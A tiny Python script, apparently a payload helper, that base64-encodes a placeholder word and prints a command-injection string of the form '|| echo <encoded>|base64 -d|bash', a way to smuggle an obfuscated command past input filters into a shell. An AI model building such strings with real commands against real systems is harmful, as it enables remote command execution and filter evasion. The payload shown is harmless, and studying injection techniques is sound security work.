import base64
c='this'.encode()
print(c)
print(base64.b64encode(c).decode())
cmd = "|| echo " + base64.b64encode(c).decode() + "|base64 -d|bash"
print(cmd)